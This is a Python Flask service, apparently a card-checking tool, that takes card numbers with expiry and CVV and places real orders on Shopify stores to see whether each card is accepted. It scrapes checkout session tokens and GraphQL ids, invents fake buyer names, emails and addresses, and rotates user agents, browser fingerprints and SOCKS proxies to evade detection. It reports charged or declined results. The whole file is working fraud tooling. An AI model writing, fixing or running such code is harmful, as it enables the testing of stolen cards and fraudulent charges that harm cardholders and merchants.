import os, random, re, html, string, uuid, time, json, urllib3
from urllib.parse import quote, unquote, urlparse, parse_qs
from flask import Flask, request, jsonify
from curl_cffi import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
app = Flask(__name__)

BROWSER_PROFILES = ["chrome124","chrome120","chrome116","chrome110","chrome107","edge101","safari15_5","safari17_0"]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

FIRST_NAMES = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles"]
LAST_NAMES  = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com"]
ADDRESSES = [
    {"street":"100 SW Main St","city":"Portland","state":"OR","zip":"97204","phone":"+15035550100"},
    {"street":"223 Pioneer Blvd","city":"Salem","state":"OR","zip":"97301","phone":"+15035550101"},
    {"street":"101 N Last Chance Gulch","city":"Helena","state":"MT","zip":"59601","phone":"+14065550100"},
    {"street":"1 Granite St","city":"Concord","state":"NH","zip":"03301","phone":"+16035550100"},
    {"street":"100 W 10th St","city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
]

def generate_identity():
    fn = random.choice(FIRST_NAMES); ln = random.choice(LAST_NAMES)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(1,9999)}@{random.choice(EMAIL_DOMAINS)}"
    a = random.choice(ADDRESSES)
    return fn, ln, email, a["street"], a["city"], a["state"], a["zip"], a["phone"]

def random_suffix(n=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ---------- extraction helpers ----------
def extract_session_token(raw_html):
    for pat in [r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                r'"X-Checkout-One-Session-Token"\s*:\s*"([^"]+)"',
                r'"sessionToken"\s*:\s*"([^"]+)"']:
        m = re.search(pat, raw_html)
        if m:
            t = m.group(1).strip()
            if t.startswith("&quot;"): t = t[6:]
            if t.endswith("&quot;"): t = t[:-6]
            t = t.strip('"\'')
            if len(t) > 50: return t
    return ""

def extract_commit_sha(checkout_html):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(checkout_html))
    return m.group(1) if m else ""

def extract_stable_id(checkout_html):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f-]{36})"', html.unescape(checkout_html))
    return m.group(1) if m else ""

def extract_queue_token(proposal_json):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return m.group(1) if m else ""

def extract_signed_handles(proposal_json):
    try:
        d = json.loads(proposal_json)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        de = seller.get("deliveryExpectations",{})
        if de.get("__typename") == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations",[]) if x.get("signedHandle")]
    except Exception: pass
    return []

def extract_delivery_handle(proposal_body):
    try:
        d = json.loads(proposal_body)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        h = seller.get("selectedDeliveryStrategy",{}).get("handle")
        if h: return h
        for dg in seller.get("deliveryGroups",[]):
            for opt in dg.get("deliveryOptions",[]):
                if opt.get("handle"): return opt["handle"]
    except Exception: pass
    return ""

# FIX: robust payment-method extraction via JSON traversal
def extract_payment_method_id(proposal_body):
    try:
        data = json.loads(proposal_body)
        found = []
        def walk(o):
            if isinstance(o, dict):
                if isinstance(o.get("paymentMethodIdentifier"), str):
                    found.append(o)
                for v in o.values(): walk(v)
            elif isinstance(o, list):
                for x in o: walk(x)
        walk(data)
        for m in found:
            if "shopify_payment" in str(m.get("name","")).lower():
                return m["paymentMethodIdentifier"]
        return found[0]["paymentMethodIdentifier"] if found else ""
    except Exception:
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', proposal_body)
        return m.group(1) if m else ""

def extract_checkout_total(proposal_body):
    try:
        d = json.loads(proposal_body)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        amt = seller.get("total",{}).get("value",{}).get("amount","")
        if amt: return amt
    except Exception: pass
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""

def extract_tax_amount(proposal_json):
    try:
        d = json.loads(proposal_json)
        seller = d.get("data",{}).get("session",{}).get("negotiate",{}).get("result",{}).get("sellerProposal",{})
        return seller.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
    except Exception: return "0.0"

# FIX: helper to surface GraphQL errors
def gql_error(r):
    if r.status_code != 200:
        return f"HTTP_{r.status_code}"
    try:
        d = r.json()
    except Exception:
        return "BAD_JSON"
    errs = d.get("errors") or []
    if errs:
        return "GQL_" + str(errs[0].get("message","err"))[:40].replace(" ","_")
    return ""

# ---------- GraphQL id fetcher ----------
def fetch_graphql_ids(session, shop_url, checkout_html, ua):
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    if not m: return None, None, None
    try:
        js = session.get(shop_url + m.group(1), headers={"user-agent":ua}, timeout=10).text
        p = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
        s = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
        q = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"', js)
        return (p.group(1) if p else None, s.group(1) if s else None, q.group(1) if q else None)
    except Exception:
        return None, None, None

# FIX: multi-endpoint product discovery
def find_cheapest_product(session, shop_url, ua):
    endpoints = [
        f"{shop_url}/products.json?limit=250",
        f"{shop_url}/collections/all/products.json?limit=250",
        f"{shop_url}/collections/frontpage/products.json?limit=250",
    ]
    for ep in endpoints:
        try:
            r = session.get(ep, headers={"user-agent":ua}, timeout=10)
            if r.status_code != 200: continue
            try: data = r.json()
            except Exception: continue
            products = data.get("products", []) if isinstance(data, dict) else []
            if not products: continue
            best_price, best_variant = float("inf"), None
            for p in products:
                for v in p.get("variants", []):
                    if not v.get("available"): continue
                    try: price = float(str(v.get("price","0")).replace(",", "."))
                    except Exception: continue
                    if price > 0 and price < best_price:       # FIX: removed 0.50 floor
                        best_price, best_variant = price, str(v.get("id"))
            if best_variant: return best_variant, str(best_price)
        except Exception: continue
    return None, None

# ---------- payload builder ----------
def street_addr_dict(addr):
    """Convert internal identity dict → Shopify streetAddress shape (FIX: used for both proposal & submit)."""
    return {
        "address1": addr.get("street",""), "city": addr.get("city",""),
        "countryCode": "US", "postalCode": addr.get("zip",""),
        "firstName": addr.get("fn",""), "lastName": addr.get("ln",""),
        "zoneCode": addr.get("state",""), "phone": addr.get("phone",""),
    }

def build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, proposal_id):
    if addr:
        sa = street_addr_dict(addr)
        dest = {"partialStreetAddress": {"address1": sa["address1"], "city": sa["city"],
                "countryCode":"US","lastName": sa["lastName"],"phone":"","oneTimeUse":False}}
        bill = {"streetAddress": sa}
    else:
        dest = {"partialStreetAddress": {"address1":"1 Main St","city":"New York",
                "countryCode":"US","lastName":"Test","phone":"","oneTimeUse":False}}
        bill = None

    payment = {"totalAmount": {"any": True}, "paymentLines": []}
    if bill: payment["billingAddress"] = bill   # FIX: omit key when None (was null)

    return {
        "variables": {
            "sessionInput": {"sessionToken": session_token},
            "queueToken": None,
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "delivery": {"deliveryLines": [{
                "destination": dest,
                "selectedDeliveryStrategy": {"deliveryStrategyMatchingConditions":
                    {"estimatedTimeInTransit":{"any":True},"shipments":{"any":True}}, "options":{}},
                "targetMerchandiseLines": {"any": True},
                "deliveryMethodTypes": ["SHIPPING"],
                "expectedTotalPrice": {"any": True},
                "destinationChanged": True,
            }], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
            "deliveryExpectations": {"deliveryExpectationLines": []},
            "merchandise": {"merchandiseLines": [{
                "stableId": stable_id,
                "merchandise": {"productVariantReference": {
                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                    "variantId": f"gid://shopify/ProductVariant/{variant_id}"}},
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": amount, "currencyCode": currency}},
            }]},
            "memberships": {"memberships": []},
            "payment": payment,
            "buyerIdentity": {
                "customer": {"presentmentCurrency": currency, "countryCode": "US"},
                "email": email or None,
                "emailChanged": bool(email),
                "phoneCountryCode": "US",
                "marketingConsent": [], "rememberMe": False,
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
        },
        "operationName": "Proposal",
        "id": proposal_id,
    }

# ---------- per-site checkout attempt ----------
def attempt_checkout(session, shop_url, ccn, mm, yyyy, cvv, ua, prop_id_default, submit_id_default):
    variant_id, price = find_cheapest_product(session, shop_url, ua)
    if not variant_id:
        return {"Response": "NO_PRODUCTS", "success": False}

    r = session.get(f"{shop_url}/cart/{variant_id}:1", headers={"user-agent":ua}, allow_redirects=True, timeout=15)
    if r.status_code != 200:
        return {"Response": "CART_FAILED", "success": False}

    checkout_url, checkout_html = r.url, r.text
    cart_token_m = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    cart_token = cart_token_m.group(1) if cart_token_m else ""

    session_token = extract_session_token(checkout_html)
    commit_sha    = extract_commit_sha(checkout_html)
    stable_id     = extract_stable_id(checkout_html)
    if not (session_token and commit_sha and stable_id):
        return {"Response": "MISSING_TOKENS", "success": False}

    prop_id, submit_id, _ = fetch_graphql_ids(session, shop_url, checkout_html, ua)
    prop_id   = prop_id   or prop_id_default
    submit_id = submit_id or submit_id_default

    currency = "USD"
    m = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', checkout_html)
    if m: currency = m.group(1)
    amount = price
    m = re.search(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{"amount"\s*:\s*"([\d.]+)"', checkout_html)
    if m: amount = m.group(1)

    fn, ln, email, street, city, state, zipc, phone = generate_identity()
    addr = {"street":street,"city":city,"state":state,"zip":zipc,"fn":fn,"ln":ln,"phone":phone}

    headers = {
        "accept":"application/json","content-type":"application/json",
        "origin": shop_url, "referer": checkout_url,
        "shopify-checkout-client":"checkout-web/1.0",
        "shopify-checkout-source": f'id="{cart_token}", type="cn"',
        "user-agent": ua,
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": commit_sha,
    }

    # Proposal 1
    r1 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                      headers=headers, json=build_proposal_payload(session_token, stable_id, variant_id, amount, currency, None, None, prop_id), timeout=15)
    err = gql_error(r1)
    if err: return {"Response": f"P1_{err}", "success": False}
    queue_token = extract_queue_token(r1.text) or None      # FIX: None not ""

    # Proposal 2
    p2 = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, None, prop_id)
    p2["variables"]["queueToken"] = queue_token
    r2 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                      headers=headers, json=p2, timeout=15)
    err = gql_error(r2)
    if err: return {"Response": f"P2_{err}", "success": False}

    # Proposal 3
    p3 = build_proposal_payload(session_token, stable_id, variant_id, amount, currency, email, addr, prop_id)
    p3["variables"]["queueToken"] = queue_token
    r3 = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
                      headers=headers, json=p3, timeout=15)
    err = gql_error(r3)
    if err: return {"Response": f"P3_{err}", "success": False}

    payment_method_id = extract_payment_method_id(r3.text)
    delivery_handle   = extract_delivery_handle(r3.text)
    signed_handles    = extract_signed_handles(r3.text)
    tax_amount        = extract_tax_amount(r3.text)
    real_total        = extract_checkout_total(r3.text)
    if real_total: amount = real_total

    if not payment_method_id:
        return {"Response": "NO_PAYMENT_METHOD", "success": False,
                "Debug": "shopify_payments_not_in_response"}

    # PCI tokenization
    pci = session.post("https://checkout.pci.shopifyinc.com/sessions",
        json={"credit_card":{"number":ccn,"month":int(mm),"year":int(yyyy),
              "verification_value":cvv,"name":f"{fn} {ln}"},
              "payment_session_scope": shop_url.split("//")[1]},
        headers={"origin":"https://checkout.pci.shopifyinc.com","user-agent":ua}, timeout=15)
    session_id = (pci.json() or {}).get("id")
    if not session_id:
        return {"Response": "PCI_FAILED", "success": False}

    sa = street_addr_dict(addr)                # FIX: convert before submit
    submit_payload = {
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                "queueToken": queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {"deliveryLines":[{
                    "destination": {"streetAddress": sa},
                    "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {
                        "handle": delivery_handle, "customDeliveryRate": False}, "options": {}},
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": False,
                }], "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True},
                "deliveryExpectations": {"deliveryExpectationLines":[{"signedHandle":h} for h in signed_handles]},
                "merchandise": {"merchandiseLines":[{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}"}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                }]},
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"value": {"amount": amount, "currencyCode": currency}},
                    "paymentLines": [{
                        "paymentMethod": {"directPaymentMethod": {
                            "sessionId": session_id,
                            "paymentMethodIdentifier": payment_method_id,
                            "billingAddress": {"streetAddress": sa},   # FIX
                            "cardSource": None}},
                        "amount": {"value": {"amount": amount, "currencyCode": currency}}}],
                    "billingAddress": {"streetAddress": sa},            # FIX
                },
                "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"},
                                  "email": email, "emailChanged": False, "phoneCountryCode": "US",
                                  "marketingConsent": [], "rememberMe": False},
                "taxes": {"proposedTotalAmount": {"value": {"amount": tax_amount, "currencyCode": currency}}},
            },
            "attemptToken": f"{cart_token}-{random_suffix()}",
            "metafields": [],
            "analytics": {"requestUrl": checkout_url, "pageId": str(uuid.uuid4())},
        },
        "operationName": "SubmitForCompletion",
        "id": submit_id,
    }

    r_submit = session.post(f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                            json=submit_payload, headers=headers, timeout=15)

    if '"FailedReceipt"' in r_submit.text:
        code_m = re.search(r'"code"\s*:\s*"([^"]+)"', r_submit.text)
        code = code_m.group(1) if code_m else "DECLINED"
        return {"Response": code, "Price": f"{amount} {currency}",
                "Gate": "Shopify Payments", "success": False}
    if '"ProcessedReceipt"' in r_submit.text:
        return {"Response": "ORDER_PLACED", "Charged": "True",
                "Price": f"{amount} {currency}", "Gate": "Shopify Payments", "success": True}
    return {"Response": "UNKNOWN_SUBMIT", "success": False}

# ---------- Flask route ----------
@app.route("/")
def check_card():
    card_str  = request.args.get("card")
    proxy_str = request.args.get("proxy", "")
    if not card_str: return jsonify({"Response": "MISSING_CARD", "success": False})
    parts = card_str.split("|")
    if len(parts) < 4: return jsonify({"Response": "INVALID_CARD", "success": False})
    ccn, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    yyyy = "20" + yy if len(yy) == 2 else yy

    sites = []
    try:
        with open("site.txt", "r") as f:
            sites = [l.strip() for l in f if l.strip()]
    except Exception: pass
    if not sites: sites = ["https://thats-what-che-said.myshopify.com"]
    random.shuffle(sites)

    proxy_url = ""
    if proxy_str:
        for s in ("socks5://","socks5h://","http://","https://"):
            if proxy_str.startswith(s): proxy_str = proxy_str[len(s):]
        p = proxy_str.split(":")
        if len(p) == 2:   proxy_url = f"socks5h://{p[0]}:{p[1]}"
        elif len(p) >= 4: proxy_url = f"socks5h://{p[2]}:{p[3]}@{p[0]}:{p[1]}"

    ua  = random.choice(USER_AGENTS)
    imp = random.choice(BROWSER_PROFILES)

    DEFAULT_PROP = "6d9f0eb3d750c837c721c99da1ec1c7f1ce832d3687c5d0d0ffc1b42a610d3e8"
    DEFAULT_SUB  = "b3fd8db496438a6859c96db264b77e84b3f093d11a44c4d0a84d43e661f12419"

    last = {"Response": "ALL_SITES_FAILED", "success": False}
    # FIX: retry across up to 3 different sites on transient failures
    for shop_url in sites[:3]:
        try:
            session = requests.Session(impersonate=imp)
            if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
            res = attempt_checkout(session, shop_url, ccn, mm, yyyy, cvv, ua, DEFAULT_PROP, DEFAULT_SUB)
            # Only retry on transient/structural failures
            if res.get("success") or res.get("Response") not in (
                "NO_PRODUCTS", "NO_PAYMENT_METHOD", "CART_FAILED", "MISSING_TOKENS"
            ):
                return jsonify(res)
            last = res
        except Exception as e:
            last = {"Response": f"ERROR_{str(e)[:40]}", "success": False}
    return jsonify(last)

@app.route("/health")
def health():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), threaded=True)
